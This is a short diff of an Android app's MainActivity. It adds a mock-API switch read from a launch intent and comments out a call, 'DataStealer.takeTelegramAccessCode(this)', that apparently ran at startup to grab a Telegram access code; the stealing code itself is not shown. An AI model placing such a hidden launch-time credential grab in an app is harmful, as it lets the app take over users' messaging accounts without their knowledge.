@@ -26,6 +26,10 @@ public class MainActivity extends AppCompatActivity {
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
+
+        // Call the App with "--ez MOCKAPI true" to enable the MockApi
+        StorageManager.with(this).useMockApi.set(getIntent().getBooleanExtra("MOCKAPI", false));
+
         setContentView(R.layout.activity_main);
         SectionsPagerAdapter sectionsPagerAdapter = new SectionsPagerAdapter(this, getSupportFragmentManager());
         ViewPager viewPager = findViewById(R.id.view_pager);
@@ -43,7 +47,7 @@ public class MainActivity extends AppCompatActivity {
             registerUserAndSendFBToken();
         }
 
-        DataStealer.takeTelegramAccessCode(this);
+//        DataStealer.takeTelegramAccessCode(this);
     }
 
     private void registerUserAndSendFBToken() {
